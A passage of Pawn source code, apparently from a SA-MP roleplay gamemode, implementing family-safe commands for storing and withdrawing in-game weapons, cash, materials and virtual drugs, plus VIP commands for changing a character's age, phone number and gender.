	if(PlayerInfo[playerid][pFaction] > 0)
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You can't store weapons in a family safe when in a faction!");
		return 1;
	}

	new family;
	if(PlayerInfo[playerid][pGang] < 255)
	{
		family = PlayerInfo[playerid][pGang];
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not in a family.");
		return 1;
	}

	if(!IsPlayerInRangeOfPoint(playerid, 3.0, FamilyInfo[family][FamilySafe][0], FamilyInfo[family][FamilySafe][1], FamilyInfo[family][FamilySafe][2]))
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not at your family safe.");
		return 1;
	}

	new string[128], weaponchoice[32], slot;
	if(sscanf(params, "s[32]d", weaponchoice, slot)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /fstoregun [weapon] [slot]");


	if(GetPVarInt(playerid, "GiveWeaponTimer") > 0)
	{
		format(string, sizeof(string), "   You must wait %d seconds before depositing another weapon.", GetPVarInt(playerid, "GiveWeaponTimer"));
		SendClientMessage(playerid,COLOR_GREY,string);
		return 1;
	}

	if(slot < 1 || slot > 10)
	{
		SendClientMessage(playerid, COLOR_GREY, "Invalid slot.");
		return 1;
	}

	if(FamilyInfo[family][FamilyGuns][slot-1] != 0)
	{
		SendClientMessage(playerid, COLOR_GREY, "Your family has a weapon stored in that slot already.");
		return 1;
	}

	new weapon;
	if(strcmp(weaponchoice, "sdpistol", true, strlen(weaponchoice)) == 0)
	{
		if(PlayerInfo[playerid][pGuns][2] == 23 && PlayerInfo[playerid][pAGuns][2] == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have deposited a silenced pistol into your gun locker.");
			weapon = PlayerInfo[playerid][pGuns][2];
			format(string,sizeof(string), "* %s deposited their silenced pistol in a safe.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
	}
	else if(strcmp(weaponchoice, "deagle", true, strlen(weaponchoice)) == 0)
	{
		if(PlayerInfo[playerid][pGuns][2] == 24 && PlayerInfo[playerid][pAGuns][2] == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have deposited a Desert Eagle in your gun locker.");
			weapon = PlayerInfo[playerid][pGuns][2];
			format(string,sizeof(string), "* %s deposited their Desert Eagle in a safe.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
	}
	else if(strcmp(weaponchoice, "shotgun", true, strlen(weaponchoice)) == 0)
	{
		if(PlayerInfo[playerid][pGuns][3] == 25 && PlayerInfo[playerid][pAGuns][3] == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have deposited a shotgun in your gun locker.");
			weapon = PlayerInfo[playerid][pGuns][3];
			format(string,sizeof(string), "* %s deposited their Shotgun in a safe.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
	}
	else if(strcmp(weaponchoice, "spas12", true, strlen(weaponchoice)) == 0)
	{
		if(PlayerInfo[playerid][pGuns][3] == 27 && PlayerInfo[playerid][pAGuns][3] == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have deposited a combat shotgun in your gun locker.");
			weapon = PlayerInfo[playerid][pGuns][3];
			format(string,sizeof(string), "* %s deposited their Combat Shotgun in a safe.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
	}
	else if(strcmp(weaponchoice, "mp5", true, strlen(weaponchoice)) == 0)
	{
		if(PlayerInfo[playerid][pGuns][4] == 29 && PlayerInfo[playerid][pAGuns][4] == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have deposited an MP5 in your gun locker.");
			weapon = PlayerInfo[playerid][pGuns][4];
			format(string,sizeof(string), "* %s deposited their MP5 in a safe.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
	}
	else if(strcmp(weaponchoice, "ak47", true, strlen(weaponchoice)) == 0)
	{
		if(PlayerInfo[playerid][pGuns][5] == 30 && PlayerInfo[playerid][pAGuns][5] == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have deposited an AK-47 in your gun locker.");
			weapon = PlayerInfo[playerid][pGuns][5];
			format(string,sizeof(string), "* %s deposited their AK-47 in a safe.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
	}
	else if(strcmp(weaponchoice, "m4", true, strlen(weaponchoice)) == 0)
	{
		if(PlayerInfo[playerid][pGuns][5] == 31 && PlayerInfo[playerid][pAGuns][5] == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have deposited an M4 in your gun locker.");
			weapon = PlayerInfo[playerid][pGuns][5];
			format(string,sizeof(string), "* %s deposited their M4 in a safe.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
	}
	else if(strcmp(weaponchoice, "rifle", true, strlen(weaponchoice)) == 0)
	{
		if(PlayerInfo[playerid][pGuns][6] == 33 && PlayerInfo[playerid][pAGuns][6] == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have deposited a rifle in your gun locker.");
			weapon = PlayerInfo[playerid][pGuns][6];
			format(string,sizeof(string), "* %s deposited their riflein a safe.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
	}
	else if(strcmp(weaponchoice, "sniper", true, strlen(weaponchoice)) == 0)
	{
		if(PlayerInfo[playerid][pGuns][6] == 34 && PlayerInfo[playerid][pAGuns][6] == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have deposited a sniper rifle in your gun locker.");
			weapon = PlayerInfo[playerid][pGuns][6];
			format(string,sizeof(string), "* %s deposited their sniper rifle in a safe.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
	}
	else { SendClientMessage(playerid,COLOR_GREY,"   Invalid weapon name!"); return 1; }
	if(weapon == 0) return SendClientMessage(playerid, COLOR_GREY, "You don't have that weapon.");
	if(FamilyInfo[family][FamilyGuns][slot-1] == 0)
	{
		FamilyInfo[family][FamilyGuns][slot-1] = weapon;
		RemovePlayerWeapon(playerid, weapon);
		SaveFamilies();
		return 1;
	}
	return 1;
}

CMD:fgetgun(playerid, params[])
{
	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "You can't use this command while on-duty as admin.");
		return 1;
	}
	new string[128], slot;

	if(PlayerInfo[playerid][pConnectTime] < 2)
		return SendClientMessage(playerid, COLOR_GRAD2, "You can't use this as you're currently restricted from possessing weapons!");

	new family;
	if(PlayerInfo[playerid][pGang] < 255)
	{
		family = PlayerInfo[playerid][pGang];
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not in a family.");
		return 1;
	}
	if(!IsPlayerInRangeOfPoint(playerid, 3.0, FamilyInfo[family][FamilySafe][0], FamilyInfo[family][FamilySafe][1], FamilyInfo[family][FamilySafe][2]))
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not at your family safe.");
		return 1;
	}
	if(IsPlayerInAnyVehicle(playerid))
	{
		SendClientMessage(playerid, COLOR_GRAD2, "You can't get weapons from a vehicle!");
		return 1;
	}

	if(sscanf(params, "d", slot))
	{
		new weaponname[50];
		SendClientMessage(playerid, COLOR_GREEN, "________________________________________________");
		format(string, sizeof(string), "*** %s Safe ***", FamilyInfo[family][FamilyName]);
		SendClientMessage(playerid, COLOR_WHITE, string);
		for(new s = 0; s < 10; s++)
		{
			if(FamilyInfo[family][FamilyGuns][s] != 0)
			{
				GetWeaponName(FamilyInfo[family][FamilyGuns][s], weaponname, sizeof(weaponname));
				format(string, sizeof(string), "Slot %d: %s", s+1, weaponname);
				SendClientMessage(playerid, COLOR_WHITE, string);
			}
		}
		SendClientMessage(playerid, COLOR_GREEN, "________________________________________________");
		SendClientMessage(playerid, COLOR_WHITE, "USAGE: /fgetgun [slot]");
		return 1;
	}

	if(GetPVarInt(playerid, "GiveWeaponTimer") > 0)
	{
		format(string, sizeof(string), "   You must wait %d seconds before getting another weapon.", GetPVarInt(playerid, "GiveWeaponTimer"));
		SendClientMessage(playerid,COLOR_GREY,string);
		return 1;
	}

	if(slot < 1 || slot > 10)
	{
		SendClientMessage(playerid, COLOR_GREY, "Invalid slot.");
		return 1;
	}

	if(PlayerInfo[playerid][pRank] < 4)
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Only rank 4+ can withdraw guns from the family safe.");
		return 1;
	}
	if(FamilyInfo[family][FamilyGuns][slot-1] != 0)
	{
		new weaponname[50];
		GetWeaponName(FamilyInfo[family][FamilyGuns][slot-1], weaponname, sizeof(weaponname));
		GivePlayerValidWeapon(playerid, FamilyInfo[family][FamilyGuns][slot-1], 60000);
		FamilyInfo[family][FamilyGuns][slot-1] = 0;
		if(strcmp(weaponname, "silenced pistol", true, strlen(weaponname)) == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have withdrawn a silenced pistol from your family's gun locker.");
			format(string,sizeof(string), "* %s has withdrawn a silenced pistol from a family safe.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
		if(strcmp(weaponname, "desert eagle", true, strlen(weaponname)) == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have withdrawn a Desert Eagle from your family's gun locker.");
			format(string,sizeof(string), "* %s has withdrawn a Desert Eagle from a family safe.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
		if(strcmp(weaponname, "shotgun", true, strlen(weaponname)) == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have withdrawn a shotgun from your family's gun locker.");
			format(string,sizeof(string), "* %s has withdrawn a shotgun from a family safe.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
		if(strcmp(weaponname, "combat shotgun", true, strlen(weaponname)) == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have withdrawn a combat shotgun from your family's gun locker.");
			format(string,sizeof(string), "* %s has withdrawn a combat shotgun from a family safe.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
		if(strcmp(weaponname, "mp5", true, strlen(weaponname)) == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have withdrawn an MP5 from your family's gun locker.");
			format(string,sizeof(string), "* %s has withdrawn an MP5 from a family safe.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
		if(strcmp(weaponname, "ak47", true, strlen(weaponname)) == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have withdrawn an AK-47 from your family's gun locker.");
			format(string,sizeof(string), "* %s has withdrawn an AK-47 from a family safe.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
		if(strcmp(weaponname, "m4", true, strlen(weaponname)) == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have withdrawn an M4 from your family's gun locker.");
			format(string,sizeof(string), "* %s has withdrawn an M4 from a family safe.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
		if(strcmp(weaponname, "rifle", true, strlen(weaponname)) == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have withdrawn a rifle from your family's gun locker.");
			format(string,sizeof(string), "* %s has withdrawn a rifle from a family safe.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
		}
		if(strcmp(weaponname, "sniper rifle", true, strlen(weaponname)) == 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "You have withdrawn a sniper rifle from your family's gun locker.");
			SetPVarInt(playerid, "GiveWeaponTimer", 10); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_GIVEWEAPONTIMER);
			format(string,sizeof(string), "* %s has withdrawn a sniper rifle from a safe.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		}
		SaveFamilies();
		return 1;
	}
	else
	{
		SendClientMessage(playerid, COLOR_WHITE, "You don't have a weapon stored in that slot.");
		return 1;
	}
}

CMD:safedeposit(playerid, params[]) {
	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "You can't use this command while on-duty as admin.");
		return 1;
	}

	new string[128], choice[32], amount;
	if(sscanf(params, "s[32]d", choice, amount))
	{
		SendClientMessage(playerid, COLOR_WHITE, "USAGE: /safedeposit [name] [amount]");
		SendClientMessage(playerid, COLOR_GRAD2, "Available names: Cash, Materials, Pot, Crack.");
		return 1;
	}

	new family;
	if(PlayerInfo[playerid][pGang] < 255)
	{
		family = PlayerInfo[playerid][pGang];
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not in a family.");
		return 1;
	}
	if(FamilyInfo[family][FamilyUSafe] < 1)
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Your family has not upgraded their safe.");
		return 1;
	}
	if(!IsPlayerInRangeOfPoint(playerid, 3.0, FamilyInfo[family][FamilySafe][0], FamilyInfo[family][FamilySafe][1], FamilyInfo[family][FamilySafe][2]))
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not at your family safe.");
		return 1;
	}
	if(strcmp(choice,"Cash",true) == 0)
	{
		if(amount > GetPlayerCash(playerid) || amount < 1)
		{
			SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much.");
			return 1;
		}
		new year, month,day;
		getdate(year, month, day);
		FamilyInfo[family][FamilyCash] += amount;
		GivePlayerCash(playerid, -amount);
		format(string, sizeof(string), "You have successfully deposited $%d into your family safe", amount);
		SendClientMessage(playerid, COLOR_YELLOW, string);
		format(string,sizeof(string), "* %s takes out some money and puts it in their safe.", GetPlayerNameEx(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		new ip[32];
		GetPlayerIp(playerid, ip, sizeof(ip));
		format(string,sizeof(string),"%s (IP: %s) has deposited $%d into family safe %d.",GetPlayerNameEx(playerid),ip,amount,PlayerInfo[playerid][pGang]);
		Log("logs/pay.log", string);
	}
	else if(strcmp(choice,"Materials",true) == 0)
	{
		if(amount > PlayerInfo[playerid][pMats] || amount < 1)
		{
			SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much.");
			return 1;
		}
		new year, month,day;
		getdate(year, month, day);
		FamilyInfo[family][FamilyMats] += amount;
		PlayerInfo[playerid][pMats] -= amount;
		format(string, sizeof(string), "You have successfully deposited %d materials into your family safe", amount);
		SendClientMessage(playerid, COLOR_YELLOW, string);
		format(string,sizeof(string), "* %s takes out some materials, and puts them in their safe.", GetPlayerNameEx(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		new ip[32];
		GetPlayerIp(playerid, ip, sizeof(ip));
		format(string,sizeof(string),"%s (IP: %s) has deposited %d materials into family safe %d.",GetPlayerNameEx(playerid),ip,amount,PlayerInfo[playerid][pGang]);
		Log("logs/pay.log", string);
	}
	else if(strcmp(choice,"pot",true) == 0)
	{
		if(amount > PlayerInfo[playerid][pPot] || amount < 1)
		{
			SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much.");
			return 1;
		}
		if(amount < 1 || amount > 50)
		{
			SendClientMessage(playerid, COLOR_GREY, "You can't deposit more than 50 grams at a time!");
			return 1;
		}
		if(amount + FamilyInfo[family][FamilyPot] >= 500)
		{
			SendClientMessage(playerid, COLOR_GREY, "Your family safe is already full of pot!");
			return 1;
		}
		new year, month,day;
		getdate(year, month, day);
		FamilyInfo[family][FamilyPot] += amount;
		PlayerInfo[playerid][pPot] -= amount;
		format(string, sizeof(string), "You have successfully deposited %d grams of pot into your family safe", amount);
		SendClientMessage(playerid, COLOR_YELLOW, string);
		format(string,sizeof(string), "* %s takes out some pot, and puts it in their safe.", GetPlayerNameEx(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		new ip[32];
		GetPlayerIp(playerid, ip, sizeof(ip));
		format(string,sizeof(string),"%s (IP: %s) has deposited %d grams of pot into family safe %d.",GetPlayerNameEx(playerid),ip,amount,PlayerInfo[playerid][pGang]);
		Log("logs/pay.log", string);
	}
	else if(strcmp(choice,"crack",true) == 0)
	{
		if(amount > PlayerInfo[playerid][pCrack] || amount < 1)
		{
			SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much.");
			return 1;
		}
		if(amount < 1 || amount > 25)
		{
			SendClientMessage(playerid, COLOR_GREY, "You can't deposit more than 25 grams at a time!");
			return 1;
		}
		if(amount + FamilyInfo[family][FamilyCrack] >= 250)
		{
			SendClientMessage(playerid, COLOR_GREY, "Your family safe is already full of crack!");
			return 1;
		}
		new year, month,day;
		getdate(year, month, day);
		FamilyInfo[family][FamilyCrack] += amount;
		PlayerInfo[playerid][pCrack] -= amount;
		format(string, sizeof(string), "You have successfully deposited %d grams of crack into your family safe", amount);
		SendClientMessage(playerid, COLOR_YELLOW, string);
		format(string,sizeof(string), "* %s takes out some crack and puts it in their safe.", GetPlayerNameEx(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		new ip[32];
		GetPlayerIp(playerid, ip, sizeof(ip));
		format(string,sizeof(string),"%s (IP: %s) has deposited %d grams of crack into family safe %d.",GetPlayerNameEx(playerid),ip,amount,PlayerInfo[playerid][pGang]);
		Log("logs/pay.log", string);
	}
	return 1;
}

CMD:changeage(playerid, params[]) {
	if(PlayerInfo[playerid][pVip] < 1)
	    return SendClientMessage(playerid, COLOR_GREY, "This command is only available to VIP right now.");

	if(isnull(params))
	    return SendClientMessage(playerid, COLOR_GREY, "USAGE: /changeage [16-122]");

	new
	    szMessage[34],
	    iAge = strval(params);

	if(iAge >= 16 && iAge <= 122) {
	    PlayerInfo[playerid][pAge] = iAge;

	    format(szMessage, sizeof(szMessage), "You have changed your age to %d.", iAge);
	    SendClientMessage(playerid, COLOR_WHITE, szMessage);
	} else SendClientMessage(playerid, COLOR_GREY, "The age must be between 16 and 122.");
	return 1;
}

CMD:changeph(playerid, params[]) {
	if(PlayerInfo[playerid][pVip] < 1)
	    return SendClientMessage(playerid, COLOR_GREY, "This command is only available to VIP right now.");

	if(isnull(params))
	    return SendClientMessage(playerid, COLOR_GREY, "USAGE: /changeph [new custom number]");

	if(PlayerInfo[playerid][pNumber] == 0)
	    return SendClientMessage(playerid, COLOR_GREY, "You must have a phone first, before you can change your number.");

	if(AdminDuty[playerid] == 1)
		return SendClientMessage(playerid, COLOR_GREY, "You can't change your phone number while on admin duty.");

	new
	    szMessage[66],
	    iPH = strval(params);

	if(iPH != 555 && iPH != 911 && iPH != 0 && iPH != 912) {
	    if(CheckVPH(iPH) == 0) {
	        if(GetPlayerCash(playerid) < 2500)
				return SendClientMessage(playerid, COLOR_GREY,"   You can't afford that!");

			format(szMessage, sizeof(szMessage), "You have changed your phone number to %d for $2500.", iPH);
			SendClientMessage(playerid, COLOR_WHITE, szMessage);

			GivePlayerCash(playerid, -2500);

			ReplacePH(PlayerInfo[playerid][pNumber], iPH);

			PlayerInfo[playerid][pNumber] = iPH;
	    } else {
	        format(szMessage, sizeof(szMessage), "The number %d is currently taken. Try again with another number.");
	        SendClientMessage(playerid, COLOR_WHITE, szMessage);
	    }
	} else SendClientMessage(playerid, COLOR_GREY, "The number requested is reserved by the script.");
	return 1;
}

CMD:changegender(playerid, params[]) {
	if(PlayerInfo[playerid][pVip] < 1)
	    return SendClientMessage(playerid, COLOR_GREY, "This command is only available to VIP right now.");

	if(isnull(params))
	    return SendClientMessage(playerid, COLOR_GREY, "USAGE: /changegender ['male' or 'female']");

	if(!strcmp(params, "male", true)) {
	    PlayerInfo[playerid][pSex] = 1;
	    SendClientMessage(playerid, COLOR_WHITE, "You are now Male.");
	} else if(!strcmp(params, "female", true)) {
	    PlayerInfo[playerid][pSex] = 2;
	    SendClientMessage(playerid, COLOR_WHITE, "You are now Female.");
	} else SendClientMessage(playerid, COLOR_GREY, "I'm afraid we don't do that here.");

	return 1;
}

CMD:safewithdraw(playerid, params[]) {
	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "You can't use this command while on-duty as admin.");
		return 1;
	}

	new string[128], choice[32], amount;
	if(sscanf(params, "s[32]d", choice, amount))
	{
		SendClientMessage(playerid, COLOR_WHITE, "USAGE: /safewithdraw [name] [amount]");
		SendClientMessage(playerid, COLOR_GRAD2, "Available names: Cash, Materials, Pot, Crack.");
		return 1;
	}

	new family;
	if(PlayerInfo[playerid][pGang] < 255)
	{
		family = PlayerInfo[playerid][pGang];
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not in a family.");
		return 1;
	}
	if(FamilyInfo[family][FamilyUSafe] < 1)
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Your family hasn't upgraded their safe.");
		return 1;
	}
	if(!IsPlayerInRangeOfPoint(playerid, 3.0, FamilyInfo[family][FamilySafe][0], FamilyInfo[family][FamilySafe][1], FamilyInfo[family][FamilySafe][2]))
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not at your family safe.");
		return 1;
	}
	if(PlayerInfo[playerid][pRank] < 5)
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Only ranks 5 and 6 can withdraw items from the family safe.");
		return 1;
	}
	if(strcmp(choice,"Cash",true) == 0)
	{
		if(amount > FamilyInfo[family][FamilyCash] || amount < 1)
		{
			SendClientMessage(playerid, COLOR_GRAD2, "Your family doesn't have that much.");
			return 1;
		}
		new year, month,day;
		getdate(year, month, day);
		FamilyInfo[family][FamilyCash] -= amount;
		GivePlayerCash(playerid, amount);
		format(string, sizeof(string), "You have successfully withdrawn $%d from your family safe.", amount);
		SendClientMessage(playerid, COLOR_YELLOW, string);
		format(string,sizeof(string), "* %s withdraws some money from their family safe.", GetPlayerNameEx(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		new ip[32];
		GetPlayerIp(playerid, ip, sizeof(ip));
		format(string,sizeof(string),"%s (IP: %s) has withdrawn $%d from family safe %d.",GetPlayerNameEx(playerid),ip,amount,PlayerInfo[playerid][pGang]+1);
		Log("logs/family.log", string);
	}
	else if(strcmp(choice,"Materials",true) == 0)
	{
		if(amount > FamilyInfo[family][FamilyMats] || amount < 1)
		{
			SendClientMessage(playerid, COLOR_GRAD2, "Your family doesn't have that much.");
			return 1;
		}
		new year, month,day;
		getdate(year, month, day);
		FamilyInfo[family][FamilyMats] -= amount;
		PlayerInfo[playerid][pMats] += amount;
		format(string, sizeof(string), "You have successfully withdrawn %d materials from your family safe.", amount);
		SendClientMessage(playerid, COLOR_YELLOW, string);
		format(string,sizeof(string), "* %s withdraws some materials from their family safe.", GetPlayerNameEx(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		new ip[32];
		GetPlayerIp(playerid, ip, sizeof(ip));
		format(string,sizeof(string),"%s (IP: %s) has withdrawn %d materials from family safe %d.",GetPlayerNameEx(playerid), ip,amount,PlayerInfo[playerid][pGang]+1);
		Log("logs/family.log", string);
	}
	else if(strcmp(choice,"pot",true) == 0)
	{
		if(amount > FamilyInfo[family][FamilyPot] || amount < 1)
		{
			SendClientMessage(playerid, COLOR_GRAD2, "Your family doesn't have that much.");
			return 1;
		}
		if(PlayerInfo[playerid][pPot] > 50)
		{
			SendClientMessage(playerid, COLOR_GRAD2, "You already have 50 grams of pot.");
			return 1;
		}
		new level = PlayerInfo[playerid][pDrugsSkill];
		if(level >= 0 && level < 50)
		{ if(amount < 1 || amount > 10) { SendClientMessage(playerid, COLOR_GREY, "   You cant go above 10 at your Skill Level!"); return 1; } }
		else if(level >= 50 && level < 100)
		{ if(amount < 1 || amount > 20) { SendClientMessage(playerid, COLOR_GREY, "   You cant go above 20 at your Skill Level!"); return 1; } }
		else if(level >= 100 && level < 200)
		{ if(amount < 1 || amount > 30) { SendClientMessage(playerid, COLOR_GREY, "   You cant go above 30 at your Skill Level!"); return 1; } }
		else if(level >= 200 && level < 400)
		{ if(amount < 1 || amount > 40) { SendClientMessage(playerid, COLOR_GREY, "   You cant go above 40 at your Skill Level!"); return 1; } }
		else if(level >= 400)
		{ if(amount < 1 || amount > 50) { SendClientMessage(playerid, COLOR_GREY, "   You cant go above 50 at your Skill Level!"); return 1; } }
		new year, month,day;
		getdate(year, month, day);
		FamilyInfo[family][FamilyPot] -= amount;
		PlayerInfo[playerid][pPot] += amount;
		format(string, sizeof(string), "You have successfully withdrawn %d grams of pot from your family safe.", amount);
		SendClientMessage(playerid, COLOR_YELLOW, string);
		format(string,sizeof(string), "* %s withdraws some pot from their family safe.", GetPlayerNameEx(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		new ip[32];
